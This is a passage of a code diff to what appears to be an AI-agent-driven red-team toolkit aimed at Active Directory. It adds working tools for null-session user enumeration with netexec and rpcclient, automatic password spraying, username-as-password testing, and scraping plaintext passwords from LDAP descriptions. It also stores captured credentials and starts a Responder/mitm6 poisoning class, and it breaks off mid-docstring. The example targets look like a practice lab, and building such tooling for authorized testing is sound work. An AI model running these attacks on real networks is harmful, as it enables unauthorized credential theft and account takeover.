@@ -30,6 +30,60 @@ from ares.core.remote import run_remote
 logger = logging.getLogger(__name__)
 
 
+def _format_weakness_block(
+    title: str,
+    vulnerability: str,
+    details: dict[str, str] | None = None,
+    impact: str | None = None,
+    discovery_method: str | None = None,
+) -> str:
+    lines: list[str] = []
+    if title:
+        lines.append(f"### {title}")
+    if vulnerability:
+        lines.append(f"**Vulnerability:** {vulnerability}")
+    if details:
+        for label, value in details.items():
+            if value:
+                lines.append(f"- **{label}:** {value}")
+    if discovery_method:
+        lines.append(f"- **Discovery Method:** {discovery_method}")
+    if impact:
+        lines.append(f"- **Impact:** {impact}")
+    return "\n".join(lines)
+
+
+def _track_cross_domain_reuse(state: RedTeamState, credential: Credential) -> None:
+    if not state or not credential.domain:
+        return
+    same_creds = [
+        c
+        for c in state.credentials
+        if c.username == credential.username and c.password == credential.password and c.domain
+    ]
+    domains = sorted({c.domain for c in same_creds})
+    if len(domains) < 2:
+        return
+    has_admin = any(c.is_admin for c in same_creds)
+    impact = (
+        "Single credential grants admin access to multiple domains"
+        if has_admin
+        else "Single credential grants access to multiple domains"
+    )
+    block = _format_weakness_block(
+        "Credential Discovery - Cross-Domain Password Reuse",
+        "Identical passwords used across trusted domains",
+        {
+            "Affected Account": credential.username,
+            "Domains": ", ".join(domains),
+        },
+        impact,
+        "Credential correlation",
+    )
+    if block not in state.weaknesses:
+        state.weaknesses.append(block)
+
+
 def _run_tool(cmd: list[str], timeout_seconds: int = 300) -> tuple[str, str, int]:
     """Execute a command on the remote Kali attack box.
 
@@ -146,6 +200,17 @@ class NetworkEnumerationTools(Toolset):
             >>> enumerate_users("192.168.1.100", "user", "pass", "DOMAIN")
             >>> enumerate_users("192.168.1.100", "", "", "")  # null session
         """
+
+        def _has_user_entries(output: str) -> bool:
+            if not output or not output.strip():
+                return False
+            for line in output.splitlines():
+                if re.search(r"\\[^:\\s]+", line):
+                    return True
+                if re.search(r"\buser(name)?:\s*\S+", line, re.IGNORECASE):
+                    return True
+            return False
+
         try:
             cmd = ["netexec", "smb", target]
 
@@ -159,11 +224,19 @@ class NetworkEnumerationTools(Toolset):
             cmd.append("--users")
 
             stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
+            output = stdout or stderr
             logger.info(
                 f"[*] User enumeration completed for {target} (user:{username}, domain:{domain})"
             )
 
-            return stdout or stderr
+            if not (username and password) and not _has_user_entries(output):
+                rpc_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
+                rpc_stdout, rpc_stderr, _ = _run_tool(rpc_cmd, timeout_seconds=120)
+                if rpc_stdout or rpc_stderr:
+                    logger.info(f"[*] Null session user enumeration fallback used for {target}")
+                    return rpc_stdout or rpc_stderr
+
+            return output
 
         except Exception as e:
             logger.error(f"User enumeration failed: {e}")
@@ -212,6 +285,85 @@ class NetworkEnumerationTools(Toolset):
             logger.error(f"Share enumeration failed: {e}")
             return f"Share enumeration failed for {target}: {e}"
 
+    @dn.tool_method
+    def save_users_to_file(
+        self, target: str, username: str = "", password: str = "", domain: str = ""
+    ) -> str:
+        """
+        Enumerate users and save them to a file for password attacks.
+
+        This tool enumerates domain users and saves them to /tmp/users.txt,
+        which can then be used with username_as_password or password_spray.
+
+        **RUN THIS FIRST** before any password-based attacks.
+
+        Args:
+            target: Domain controller IP address
+            username: Username for authentication (use empty string for null session)
+            password: Password for authentication (use empty string for null session)
+            domain: Domain for authentication (optional)
+
+        Returns:
+            Path to the users file and count of users saved
+
+        Example:
+            >>> save_users_to_file("192.168.56.10", "", "", "")  # null session
+            >>> save_users_to_file("192.168.56.10", "user", "pass", "DOMAIN")
+        """
+        try:
+            # First enumerate users
+            cmd = ["netexec", "smb", target]
+
+            if username and password:
+                cmd.extend(["-u", username, "-p", password])
+                if domain:
+                    cmd.extend(["-d", domain])
+            else:
+                cmd.extend(["-u", "", "-p", ""])
+
+            cmd.append("--users")
+
+            stdout, _stderr, _ = _run_tool(cmd, timeout_seconds=120)
+            output = stdout or ""
+
+            # Try rpcclient fallback for null session
+            if not (username and password):
+                rpc_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
+                rpc_stdout, _rpc_stderr, _ = _run_tool(rpc_cmd, timeout_seconds=120)
+                if rpc_stdout:
+                    output += "\n" + rpc_stdout
+
+            # Parse usernames from output
+            users: set[str] = set()
+
+            # Pattern for netexec: DOMAIN\username or domain\username
+            for match in re.finditer(r"[A-Za-z0-9._-]+\\([A-Za-z0-9._-]+)", output):
+                user = match.group(1)
+                # Filter out machine accounts and common noise
+                if not user.endswith("$") and user.lower() not in ("", "anonymous"):
+                    users.add(user)
+
+            # Pattern for rpcclient: user:[username] rid:[0x...]
+            for match in re.finditer(r"user:\[([^\]]+)\]", output):
+                user = match.group(1)
+                if not user.endswith("$"):
+                    users.add(user)
+
+            if not users:
+                return f"[!] No users found to save. Raw output:\n{output[:500]}"
+
+            # Save to file
+            users_file = "/tmp/users.txt"  # nosec B108  # noqa: S108
+            with open(users_file, "w") as f:
+                f.write("\n".join(sorted(users)))
+
+            logger.info(f"[+] Saved {len(users)} users to {users_file}")
+            return f"[+] Saved {len(users)} users to {users_file}\nUsers: {', '.join(sorted(users)[:20])}{'...' if len(users) > 20 else ''}"
+
+        except Exception as e:
+            logger.error(f"Save users to file failed: {e}")
+            return f"Save users to file failed: {e}"
+
 
 class CredentialDiscoveryTools(Toolset):
     """Tools for discovering credentials through low-hanging fruit attacks.
@@ -227,6 +379,93 @@ class CredentialDiscoveryTools(Toolset):
     def set_state(self, state: RedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
+
+    def _add_weakness(self, block: str) -> None:
+        if not self.state or not block:
+            return
+        if block not in self.state.weaknesses:
+            self.state.weaknesses.append(block)
+
+    def _add_credential(
+        self,
+        username: str,
+        password: str,
+        domain: str,
+        source: str,
+        is_admin: bool = False,
+    ) -> None:
+        if not self.state or not username:
+            return
+        cred = Credential(
+            username=username,
+            password=password,
+            domain=domain,
+            source=source,
+            is_admin=is_admin,
+        )
+        existing = any(
+            c.username == cred.username and c.password == cred.password and c.domain == cred.domain
+            for c in self.state.credentials
+        )
+        if existing:
+            return
+        self.state.credentials.append(cred)
+        cred_key = self.state.get_credential_key(cred.username, cred.password, cred.domain)
+        self.state.tested_credentials.add(cred_key)
+
+        _track_cross_domain_reuse(self.state, cred)
+
+    def _parse_netexec_credentials(self, result: str) -> list[tuple[str, str, str, bool]]:
+        creds: list[tuple[str, str, str, bool]] = []
+        if not result:
+            return creds
+        for line in result.splitlines():
+            if "[+]" not in line and "Pwn3d!" not in line:
+                continue
+            match = re.search(r"([A-Za-z0-9_.-]+)\\([^:\s]+):(\S+)", line)
+            if not match:
+                continue
+            domain, username, password = match.groups()
+            is_admin = "pwn3d!" in line.lower()
+            creds.append((domain, username, password, is_admin))
+        return creds
+
+    def _extract_password_from_description(self, username: str, description: str) -> str | None:
+        if not description:
+            return None
+        match = re.search(
+            r"(?:password|pass|pwd)\\s*[:=]\\s*([^\\s,;]+)", description, re.IGNORECASE
+        )
+        if match:
+            return match.group(1)
+        if username:
+            user_match = re.search(
+                rf"{re.escape(username)}\\s*[:/\\-]\\s*([^\\s,;]+)", description, re.IGNORECASE
+            )
+            if user_match:
+                return user_match.group(1)
+        return None
+
+    def _iter_description_entries(self, raw_output: str) -> list[tuple[str, str]]:
+        entries: list[tuple[str, str]] = []
+        current_user = ""
+        current_desc = ""
+        for raw_line in raw_output.splitlines():
+            stripped = raw_line.strip()
+            if not stripped:
+                if current_user and current_desc:
+                    entries.append((current_user, current_desc))
+                current_user = ""
+                current_desc = ""
+                continue
+            lower = stripped.lower()
+            if lower.startswith("samaccountname:"):
+                current_user = stripped.split(":", 1)[1].strip()
+            elif lower.startswith("description:"):
+                current_desc = stripped.split(":", 1)[1].strip()
+        if current_user and current_desc:
+            entries.append((current_user, current_desc))
+        return entries
 
     @dn.tool_method
     def ldap_search_descriptions(
@@ -280,8 +519,8 @@ class CredentialDiscoveryTools(Toolset):
         try:
             logger.info(f"[*] Searching LDAP descriptions for passwords in {domain}")
             stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=120)
-
-            result = stdout + "\n" + (stderr or "")
+            raw_output = stdout + "\n" + (stderr or "")
+            result = raw_output
 
             # Highlight potential passwords
             if "description:" in result.lower():
@@ -293,6 +532,31 @@ class CredentialDiscoveryTools(Toolset):
                     + result
                 )
 
+            if self.state:
+                for entry_user, entry_desc in self._iter_description_entries(raw_output):
+                    password_value = self._extract_password_from_description(entry_user, entry_desc)
+                    if password_value:
+                        self._add_credential(
+                            entry_user,
+                            password_value,
+                            domain,
+                            "ldap_description",
+                        )
+                    details = {
+                        "Affected Account": entry_user,
+                        "Description": entry_desc,
+                    }
+                    if password_value:
+                        details["Password"] = password_value
+                    block = _format_weakness_block(
+                        "Credential Discovery - Password in User Description Field",
+                        "Plaintext passwords stored in user description attribute",
+                        details,
+                        "Immediate authenticated access",
+                        "LDAP enumeration",
+                    )
+                    self._add_weakness(block)
+
             return result
 
         except Exception as e:
@@ -303,8 +567,8 @@ class CredentialDiscoveryTools(Toolset):
         self,
         target: str,
         domain: str,
-        users_file: str,
         password: str,
+        users_file: str = "",
         delay_seconds: int = 0,
     ) -> str:
         """
@@ -315,36 +579,48 @@ class CredentialDiscoveryTools(Toolset):
 
         **CRITICAL**: Check lockout policy first. Default is usually 5 attempts.
 
+        If no users_file is provided, this tool will automatically enumerate users
+        from the target first using null session authentication.
+
         Args:
             target: Domain controller IP address
             domain: Target domain
-            users_file: Path to file containing usernames (one per line)
             password: Password to spray
+            users_file: Path to file containing usernames (optional - will auto-enumerate if not provided)
             delay_seconds: Delay between attempts (default: 0)
 
         Returns:
             Successful authentications (look for valid credentials)
 
         Example:
-            >>> password_spray("192.168.56.10", "north.sevenkingdoms.local", "/tmp/users.txt", "Password1")
+            >>> password_spray("192.168.56.10", "north.sevenkingdoms.local", "Password1")  # auto-enumerate
+            >>> password_spray("192.168.56.10", "north.sevenkingdoms.local", "Password1", "/tmp/users.txt")
         """
-        cmd = [
-            "netexec",
-            "smb",
-            target,
-            "-u",
-            users_file,
-            "-p",
-            password,
-            "-d",
-            domain,
-            "--continue-on-success",
-        ]
-
-        if delay_seconds > 0:
-            cmd.extend(["--jitter", str(delay_seconds)])
-
         try:
+            # Auto-enumerate users if no file provided
+            if not users_file:
+                logger.info(f"[*] No users file provided, auto-enumerating from {target}")
+                enumerated_file = self._enumerate_users_to_file(target)
+                if not enumerated_file:
+                    return "[!] Failed to enumerate users and no users_file provided. Try save_users_to_file first."
+                users_file = enumerated_file
+
+            cmd = [
+                "netexec",
+                "smb",
+                target,
+                "-u",
+                users_file,
+                "-p",
+                password,
+                "-d",
+                domain,
+                "--continue-on-success",
+            ]
+
+            if delay_seconds > 0:
+                cmd.extend(["--jitter", str(delay_seconds)])
+
             logger.info(f"[*] Password spraying {domain} with password: {password}")
             stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=300)
 
@@ -360,17 +636,103 @@ class CredentialDiscoveryTools(Toolset):
                     "→ Use found credentials for further enumeration\n\n" + result
                 )
 
+            if self.state:
+                creds = self._parse_netexec_credentials(result)
+                if creds:
+                    accounts = []
+                    for cred_domain, username, found_password, is_admin in creds:
+                        self._add_credential(
+                            username,
+                            found_password,
+                            cred_domain,
+                            "password_spray",
+                            is_admin=is_admin,
+                        )
+                        accounts.append(f"{cred_domain}\\{username}")
+                    block = _format_weakness_block(
+                        "Credential Discovery - Password Spray Success",
+                        "Weak password choice allows password spraying",
+                        {
+                            "Discovered Accounts": ", ".join(sorted(set(accounts))),
+                            "Password": password,
+                        },
+                        "Enables credential stuffing and rapid access",
+                        "Password spraying",
+                    )
+                    self._add_weakness(block)
+
             return result
 
         except Exception as e:
             return f"Password spray failed: {e}"
+
+    def _enumerate_users_to_file(self, target: str) -> str | None:
+        """Enumerate users from target and save to temp file. Returns file path or None.
+
+        Uses credentials from state if available, otherwise tries null session.
+        """
+        try:
+            output = ""
+
+            # Check if we have credentials in state to use for authenticated enumeration
+            username, password, domain = "", "", ""
+            if self.state and self.state.credentials:
+                cred = self.state.credentials[0]  # Use first available credential
+                username, password, domain = cred.username, cred.password, cred.domain
+                logger.info(f"[*] Using credential {domain}\\{username} for user enumeration")
+
+            # Try netexec with credentials or null session
+            cmd = ["netexec", "smb", target]
+            if username and password:
+                cmd.extend(["-u", username, "-p", password])
+                if domain:
+                    cmd.extend(["-d", domain])
+            else:
+                cmd.extend(["-u", "", "-p", ""])
+            cmd.append("--users")
+
+            stdout, _stderr, _ = _run_tool(cmd, timeout_seconds=120)
+            output = stdout or ""
+
+            # Try rpcclient fallback for null session only
+            if not (username and password):
+                rpc_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
+                rpc_stdout, _, _ = _run_tool(rpc_cmd, timeout_seconds=120)
+                if rpc_stdout and "NT_STATUS" not in rpc_stdout:
+                    output += "\n" + rpc_stdout
+
+            # Parse usernames
+            users: set[str] = set()
+            for match in re.finditer(r"[A-Za-z0-9._-]+\\([A-Za-z0-9._-]+)", output):
+                user = match.group(1)
+                if not user.endswith("$") and user.lower() not in ("", "anonymous"):
+                    users.add(user)
+            for match in re.finditer(r"user:\[([^\]]+)\]", output):
+                user = match.group(1)
+                if not user.endswith("$"):
+                    users.add(user)
+
+            if not users:
+                logger.warning(f"[!] No users enumerated from {target}")
+                return None
+
+            # Save to temp file
+            users_file = "/tmp/users_auto.txt"  # nosec B108  # noqa: S108
+            with open(users_file, "w") as f:
+                f.write("\n".join(sorted(users)))
+            logger.info(f"[+] Auto-enumerated {len(users)} users to {users_file}")
+            return users_file
+
+        except Exception as e:
+            logger.error(f"Auto user enumeration failed: {e}")
+            return None
 
     @dn.tool_method
     def username_as_password(
         self,
         target: str,
         domain: str,
-        users_file: str,
+        users_file: str = "",
     ) -> str:
         """
         Test if any user has their username as their password (LOW HANGING FRUIT).
@@ -380,33 +742,45 @@ class CredentialDiscoveryTools(Toolset):
 
         **RUN THIS EARLY** - Zero lockout risk, high success rate in weak environments.
 
+        If no users_file is provided, this tool will automatically enumerate users
+        from the target first using null session authentication.
+
         Args:
             target: Domain controller IP address
             domain: Target domain
-            users_file: Path to file containing usernames (one per line)
+            users_file: Path to file containing usernames (optional - will auto-enumerate if not provided)
 
         Returns:
             Users with username=password combinations
 
         Example:
+            >>> username_as_password("192.168.56.10", "north.sevenkingdoms.local")  # auto-enumerate
             >>> username_as_password("192.168.56.10", "north.sevenkingdoms.local", "/tmp/users.txt")
         """
-        # netexec's --no-bruteforce flag tests user1:user1, user2:user2, etc.
-        cmd = [
-            "netexec",
-            "smb",
-            target,
-            "-u",
-            users_file,
-            "-p",
-            users_file,
-            "-d",
-            domain,
-            "--no-bruteforce",
-            "--continue-on-success",
-        ]
-
         try:
+            # Auto-enumerate users if no file provided
+            if not users_file:
+                logger.info(f"[*] No users file provided, auto-enumerating from {target}")
+                enumerated_file = self._enumerate_users_to_file(target)
+                if not enumerated_file:
+                    return "[!] Failed to enumerate users and no users_file provided. Try save_users_to_file first."
+                users_file = enumerated_file
+
+            # netexec's --no-bruteforce flag tests user1:user1, user2:user2, etc.
+            cmd = [
+                "netexec",
+                "smb",
+                target,
+                "-u",
+                users_file,
+                "-p",
+                users_file,
+                "-d",
+                domain,
+                "--no-bruteforce",
+                "--continue-on-success",
+            ]
+
             logger.info(f"[*] Testing username=password combinations in {domain}")
             stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=300)
 
@@ -421,10 +795,137 @@ class CredentialDiscoveryTools(Toolset):
                     "→ Use found credentials for kerberoast, asrep_roast, bloodhound\n\n" + result
                 )
 
+            if self.state:
+                creds = self._parse_netexec_credentials(result)
+                if creds:
+                    accounts = []
+                    for cred_domain, username, found_password, is_admin in creds:
+                        password_value = found_password or username
+                        self._add_credential(
+                            username,
+                            password_value,
+                            cred_domain,
+                            "username_as_password",
+                            is_admin=is_admin,
+                        )
+                        accounts.append(f"{cred_domain}\\{username}")
+                    block = _format_weakness_block(
+                        "Credential Discovery - Username=Password Combinations",
+                        "Users with passwords matching their usernames",
+                        {
+                            "Discovered Accounts": ", ".join(sorted(set(accounts))),
+                        },
+                        "Immediate authenticated access",
+                        "Username-as-password test",
+                    )
+                    self._add_weakness(block)
+
             return result
 
         except Exception as e:
             return f"Username-as-password test failed: {e}"
+
+    @dn.tool_method
+    def password_policy(
+        self,
+        target: str,
+        domain: str,
+        username: str,
+        password: str,
+    ) -> str:
+        """
+        Retrieve domain password policy settings.
+
+        Use this to check complexity requirements, minimum password length,
+        and lockout thresholds before password spraying.
+
+        Args:
+            target: Domain controller IP address
+            domain: Target domain
+            username: Username for authentication
+            password: Password for authentication
+
+        Returns:
+            Password policy details from the domain controller
+
+        Example:
+            >>> password_policy("192.168.56.10", "sevenkingdoms.local", "user", "pass")
+        """
+        cmd = [
+            "netexec",
+            "smb",
+            target,
+            "-u",
+            username,
+            "-p",
+            password,
+            "-d",
+            domain,
+            "--pass-pol",
+        ]
+
+        try:
+            logger.info(f"[*] Querying password policy for {domain}")
+            stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=120)
+            result = stdout + "\n" + (stderr or "")
+
+            min_length = None
+            lockout_threshold = None
+            complexity_value = None
+
+            min_match = re.search(
+                r"(?:minimum|min)\\s+password\\s+length\\s*:\\s*(\\d+)",
+                result,
+                re.IGNORECASE,
+            )
+            if min_match:
+                min_length = int(min_match.group(1))
+
+            lockout_match = re.search(
+                r"lockout\\s+threshold\\s*:\\s*(\\d+)",
+                result,
+                re.IGNORECASE,
+            )
+            if lockout_match:
+                lockout_threshold = int(lockout_match.group(1))
+
+            complexity_match = re.search(
+                r"(?:password\\s+complexity|complexity)\\s*:\\s*([A-Za-z0-9_\\-]+)",
+                result,
+                re.IGNORECASE,
+            )
+            if complexity_match:
+                complexity_value = complexity_match.group(1).strip()
+
+            is_weak = False
+            if min_length is not None and min_length < 8:
+                is_weak = True
+            if complexity_value:
+                complexity_lower = complexity_value.lower()
+                if complexity_lower in {"disabled", "false", "no", "off", "0"}:
+                    is_weak = True
+
+            if self.state and is_weak:
+                details: dict[str, str] = {}
+                if min_length is not None:
+                    details["Minimum Password Length"] = str(min_length)
+                if lockout_threshold is not None:
+                    details["Lockout Threshold"] = str(lockout_threshold)
+                if complexity_value:
+                    details["Complexity Requirements"] = complexity_value
+                block = _format_weakness_block(
+                    "Credential Discovery - Weak Password Policy",
+                    "Insufficient password complexity requirements",
+                    details,
+                    "Enables password spraying attacks",
+                    "Password policy enumeration",
+                )
+                self._add_weakness(block)
+
+            return result
+
+        except Exception as e:
+            return f"Password policy check failed: {e}"
 
     @dn.tool_method
     def laps_dump(
@@ -2318,6 +2819,177 @@ class RedTeamReportingTools(Toolset):
         """Set the operation state for this toolset."""
         self.state = state
 
+    def _record_host(self, data: dict[str, Any]) -> str:
+        state = self.state
+        if not state:
+            return "[!] Error: No operation state available"
+        host = Host(
+            ip=data["ip"],
+            hostname=data.get("hostname", "Unknown"),
+            os=data.get("os", "Unknown"),
+            roles=data.get(
+                "roles",
+                data.get("host_type", "").split() if data.get("host_type") else [],
+            ),
+            services=data.get("services", []),
+        )
+        state.hosts.append(host)
+        logger.info(f"[+] Recorded host: {host.hostname} ({host.ip})")
+        return f"✓ Recorded host: {host.hostname} ({host.ip})"
+
+    def _record_user(self, data: dict[str, Any]) -> str:
+        state = self.state
+        if not state:
+            return "[!] Error: No operation state available"
+        user = User(
+            username=data["username"],
+            domain=data.get("domain", ""),
+            description=data.get("description", ""),
+            is_admin=data.get("is_admin", False),
+        )
+        state.users.append(user)
+        logger.info(f"[+] Recorded user: {user.username}@{user.domain}")
+        return f"✓ Recorded user: {user.username}@{user.domain}"
+
+    def _record_credential(self, data: dict[str, Any]) -> str:
+        state = self.state
+        if not state:
+            return "[!] Error: No operation state available"
+        cred = Credential(
+            username=data.get("username", "Unknown"),
+            password=data.get("password", ""),
+            domain=data.get("domain", ""),
+            source=data.get("source", "unknown"),
+            is_admin=data.get("is_admin", False),
+        )
+        state.credentials.append(cred)
+
+        cred_key = state.get_credential_key(cred.username, cred.password, cred.domain)
+        state.tested_credentials.add(cred_key)
+
+        _track_cross_domain_reuse(state, cred)
+
+        logger.info(f"[+] Recorded credential: {cred.username}@{cred.domain}")
+        return f"✓ Recorded credential: {cred.username}@{cred.domain}"
+
+    def _record_hash(self, data: dict[str, Any]) -> str:
+        state = self.state
+        if not state:
+            return "[!] Error: No operation state available"
+        hash_obj = Hash(
+            username=data.get("username", "Unknown"),
+            hash_value=data["hash_value"],
+            hash_type=data.get("hash_type", "NTLM"),
+            domain=data.get("domain", ""),
+            cracked_password=data.get("cracked_password", ""),
+        )
+        state.hashes.append(hash_obj)
+        logger.info(f"[+] Recorded hash for: {hash_obj.username}")
+        return f"✓ Recorded hash for: {hash_obj.username}"
+
+    def _record_share(self, data: dict[str, Any]) -> str:
+        state = self.state
+        if not state:
+            return "[!] Error: No operation state available"
+        share = Share(
+            host=data.get("host_ip", data.get("host", "")),
+            name=data.get("share_name", data.get("name", "")),
+            permissions=data.get("permissions", ""),
+            comment=data.get("comment", data.get("description", "")),
+        )
+        state.shares.append(share)
+        logger.info(f"[+] Recorded share: {share.name} on {share.host}")
+        return f"✓ Recorded share: {share.name} on {share.host}"
+
+    def _record_admin_access(self, data: dict[str, Any]) -> str:
+        state = self.state
+        if not state:
+            return "[!] Error: No operation state available"
+        details = data.get("details", "")
+
+        error_indicators = [
+            "not found",
+            "not available",
+            "not installed",
+            "not in path",
+            "missing",
+            "failed",
+            "error",
+            "cannot",
+            "unable",
+            "timed out",
+            "timeout",
+            "not properly configured",
+            "command not found",
+            "no such file",
+            "permission denied",
+        ]
+        details_lower = details.lower()
+
+        for indicator in error_indicators:
+            if indicator in details_lower:
+                logger.warning(
+                    f"[!] Rejecting admin_access finding - details contain error indicator '{indicator}': {details[:200]}"
+                )
+                return (
+                    f"[!] REJECTED: Cannot record admin_access with error details. "
+                    f"The details contain '{indicator}' which indicates a failure, not success. "
+                    f"Only call record_finding('admin_access') when you have CONFIRMED admin access "
+                    f"(e.g., 'Pwn3d!' in netexec output, successful secretsdump, etc.). "
+                    f"If tools are missing or not working, troubleshoot the environment first."
+                )
+
+        success_indicators = [
+            "pwn3d",
+            "admin",
+            "success",
+            "authenticated",
+            "dumped",
+            "obtained",
+        ]
+        has_success_indicator = any(ind in details_lower for ind in success_indicators)
+
+        if not has_success_indicator and details:
+            logger.warning(f"[!] Admin access claim lacks success indicators: {details[:200]}")
+            return (
+                "[!] REJECTED: admin_access finding should include evidence of success "
+                "(e.g., 'Pwn3d!' output, successful authentication, dumped credentials). "
+                "Provide specific details showing HOW admin access was confirmed."
+            )
+
+        state.has_domain_admin = True
+        event = TimelineEvent(
+            id=f"evt-{len(state.timeline):04d}",
+            timestamp=datetime.now(timezone.utc),
+            description=f"Domain admin access achieved: {details}",
+            mitre_techniques=["T1078.002"],  # Domain Accounts
+            confidence=1.0,
+            source="domain_admin_checker",
+        )
+        state.timeline.append(event)
+        logger.info("[+] CRITICAL: Domain admin access recorded!")
+        return "✓ CRITICAL: Domain admin access recorded!"
+
+    def _record_weakness(self, data: dict[str, Any]) -> str:
+        state = self.state
+        if not state:
+            return "[!] Error: No operation state available"
+        details = data.get("details", "")
+        if not details:
+            details = _format_weakness_block(
+                data.get("title", ""),
+                data.get("vulnerability", ""),
+                data.get("details"),
+                data.get("impact"),
+                data.get("discovery_method"),
+            )
+        if not details:
+            return "[!] Error: weakness finding requires details or structured fields"
+        if details not in state.weaknesses:
+            state.weaknesses.append(details)
+        logger.info("[+] Recorded weakness")
+        return "✓ Recorded weakness"
+
     @dn.tool_method
     def record_finding(
         self,
@@ -2341,7 +3013,7 @@ class RedTeamReportingTools(Toolset):
         Args:
             finding_type: Type of finding - one of:
                 "host", "user", "credential", "hash", "share",
-                "admin_access", "domain_admin", "golden_ticket"
+                "admin_access", "domain_admin", "golden_ticket", "weakness"
             data: Dictionary containing the finding data. Required fields per type:
                 - host: {"ip": str, "hostname": str, "os": str, "roles": list, "services": list}
                 - user: {"username": str, "domain": str, "description": str, "is_admin": bool}
@@ -2349,6 +3021,8 @@ class RedTeamReportingTools(Toolset):
                 - hash: {"username": str, "hash_value": str, "hash_type": str, "domain": str, "cracked_password": str}
                 - share: {"host": str, "name": str, "permissions": str, "comment": str}
                 - admin_access: {"details": str}
+                - weakness: {"details": str} or structured fields:
+                    {"title": str, "vulnerability": str, "details": dict[str, str], "impact": str, "discovery_method": str}
 
         Returns:
             Confirmation message
@@ -2378,142 +3052,19 @@ class RedTeamReportingTools(Toolset):
             return "[!] Error: No operation state available"
 
         try:
-            if finding_type == "host":
-                host = Host(
-                    ip=data["ip"],
-                    hostname=data.get("hostname", "Unknown"),
-                    os=data.get("os", "Unknown"),
-                    roles=data.get(
-                        "roles", data.get("host_type", "").split() if data.get("host_type") else []
-                    ),
-                    services=data.get("services", []),
-                )
-                self.state.hosts.append(host)
-                logger.info(f"[+] Recorded host: {host.hostname} ({host.ip})")
-                return f"✓ Recorded host: {host.hostname} ({host.ip})"
-
-            if finding_type == "user":
-                user = User(
-                    username=data["username"],
-                    domain=data.get("domain", ""),
-                    description=data.get("description", ""),
-                    is_admin=data.get("is_admin", False),
-                )
-                self.state.users.append(user)
-                logger.info(f"[+] Recorded user: {user.username}@{user.domain}")
-                return f"✓ Recorded user: {user.username}@{user.domain}"
-
-            if finding_type == "credential":
-                cred = Credential(
-                    username=data.get("username", "Unknown"),
-                    password=data.get("password", ""),
-                    domain=data.get("domain", ""),
-                    source=data.get("source", "unknown"),
-                    is_admin=data.get("is_admin", False),
-                )
-                self.state.credentials.append(cred)
-
-                # Track tested credentials
-                cred_key = self.state.get_credential_key(cred.username, cred.password, cred.domain)
-                self.state.tested_credentials.add(cred_key)
-
-                logger.info(f"[+] Recorded credential: {cred.username}@{cred.domain}")
-                return f"✓ Recorded credential: {cred.username}@{cred.domain}"
-
-            if finding_type == "hash":
-                hash_obj = Hash(
-                    username=data.get("username", "Unknown"),
-                    hash_value=data["hash_value"],
-                    hash_type=data.get("hash_type", "NTLM"),
-                    domain=data.get("domain", ""),
-                    cracked_password=data.get("cracked_password", ""),
-                )
-                self.state.hashes.append(hash_obj)
-                logger.info(f"[+] Recorded hash for: {hash_obj.username}")
-                return f"✓ Recorded hash for: {hash_obj.username}"
-
-            if finding_type == "share":
-                share = Share(
-                    host=data.get("host_ip", data.get("host", "")),
-                    name=data.get("share_name", data.get("name", "")),
-                    permissions=data.get("permissions", ""),
-                    comment=data.get("comment", data.get("description", "")),
-                )
-                self.state.shares.append(share)
-                logger.info(f"[+] Recorded share: {share.name} on {share.host}")
-                return f"✓ Recorded share: {share.name} on {share.host}"
-
-            if finding_type == "admin_access":
-                details = data.get("details", "")
-
-                # Validate that this is actually a success, not an error being misreported
-                error_indicators = [
-                    "not found",
-                    "not available",
-                    "not installed",
-                    "not in path",
-                    "missing",
-                    "failed",
-                    "error",
-                    "cannot",
-                    "unable",
-                    "timed out",
-                    "timeout",
-                    "not properly configured",
-                    "command not found",
-                    "no such file",
-                    "permission denied",
-                ]
-                details_lower = details.lower()
-
-                for indicator in error_indicators:
-                    if indicator in details_lower:
-                        logger.warning(
-                            f"[!] Rejecting admin_access finding - details contain error indicator '{indicator}': {details[:200]}"
-                        )
-                        return (
-                            f"[!] REJECTED: Cannot record admin_access with error details. "
-                            f"The details contain '{indicator}' which indicates a failure, not success. "
-                            f"Only call record_finding('admin_access') when you have CONFIRMED admin access "
-                            f"(e.g., 'Pwn3d!' in netexec output, successful secretsdump, etc.). "
-                            f"If tools are missing or not working, troubleshoot the environment first."
-                        )
-
-                # Require some positive indicator of success
-                success_indicators = [
-                    "pwn3d",
-                    "admin",
-                    "success",
-                    "authenticated",
-                    "dumped",
-                    "obtained",
-                ]
-                has_success_indicator = any(ind in details_lower for ind in success_indicators)
-
-                if not has_success_indicator and len(details) > 0:
-                    logger.warning(
-                        f"[!] Admin access claim lacks success indicators: {details[:200]}"
-                    )
-                    return (
-                        "[!] REJECTED: admin_access finding should include evidence of success "
-                        "(e.g., 'Pwn3d!' output, successful authentication, dumped credentials). "
-                        "Provide specific details showing HOW admin access was confirmed."
-                    )
-
-                self.state.has_domain_admin = True
-                event = TimelineEvent(
-                    id=f"evt-{len(self.state.timeline):04d}",
-                    timestamp=datetime.now(timezone.utc),
-                    description=f"Domain admin access achieved: {details}",
-                    mitre_techniques=["T1078.002"],  # Domain Accounts
-                    confidence=1.0,
-                    source="domain_admin_checker",
-                )
-                self.state.timeline.append(event)
-                logger.info("[+] CRITICAL: Domain admin access recorded!")
-                return "✓ CRITICAL: Domain admin access recorded!"
-
-            return f"[!] Unknown finding type: {finding_type}"
+            handlers = {
+                "host": self._record_host,
+                "user": self._record_user,
+                "credential": self._record_credential,
+                "hash": self._record_hash,
+                "share": self._record_share,
+                "admin_access": self._record_admin_access,
+                "weakness": self._record_weakness,
+            }
+            handler = handlers.get(finding_type)
+            if not handler:
+                return f"[!] Unknown finding type: {finding_type}"
+            return handler(data)
 
         except Exception as e:
             logger.error(f"[!] Error recording finding: {e}")
@@ -2655,6 +3206,108 @@ class CoercionTools(Toolset):
 
         except Exception as e:
             return f"Coercer failed: {e}"
+
+
+class PoisoningTools(Toolset):
+    """Tools for network poisoning (Responder, mitm6)."""
+
+    state: RedTeamState | None = None
+
+    def set_state(self, state: RedTeamState) -> None:
+        """Set the operation state for this toolset."""
+        self.state = state
+
+    @dn.tool_method
+    def responder(
+        self,
+        interface: str = "eth0",
+        analyze: bool = False,
+        duration_seconds: int = 600,
+    ) -> str:
+        """
